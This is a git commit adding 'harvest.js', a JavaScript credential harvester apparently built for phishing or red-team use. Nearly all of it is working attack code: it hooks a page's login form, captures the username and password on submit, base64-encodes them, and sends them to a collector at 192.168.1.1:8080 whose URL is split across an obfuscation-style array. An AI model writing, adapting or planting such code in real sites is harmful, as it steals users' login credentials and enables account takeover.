44ce1aa2f537a05d3e575cdae93fe801bfa8cc67
toneillcodes <148013535+toneillcodes@users.noreply.github.com>
2024-08-28 21:12:27 -0400

    The first iteration of a JavaScript web harvester

---
+++ harvest.js
@@ -0,0 +1,41 @@
+siteId = "7e578ae5";
+formId = "93djokdi";
+var enableEncoding = true;
+var _0x3745 = ["http","://","192.168.1.1",":8080/harvest?data="];
+
+$(document).ready(function() {
+        console.log("initializing harvester...");
+        initHarvester();
+});
+
+function initHarvester() {
+	var loginForm = $('#loginform');
+	if(loginForm) {
+		$('#loginform').append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
+		$('#loginform').append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
+		$('#loginform').append("<input type='submit' onClick='grabIt(); return false;'/>");
+		console.log("locked and loaded");
+	} else {
+		console.log("ERROR: harvester failed to locate 'loginform', check your HTML");
+	}
+}
+
+function grabIt() {
+	var username = null;
+	username = $('#username').val();
+	var password = null;
+	password = $('#password').val();
+	var siteId = null;
+	siteId = $('#siteId').val();
+	var formId = null;
+	formId = $('#formId').val();
+	if(username || password) {
+		var payload = "siteid:" + siteId + "&formId:" + formId + "&username:" + username + "&password:" + password;
+		if(enableEncoding)
+				payload = btoa(payload);
+		console.log("Captured credentials: " + payload);
+		$.get(_0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + payload);
+	} else {
+		console.log("No credentials were found");
+	}
+}
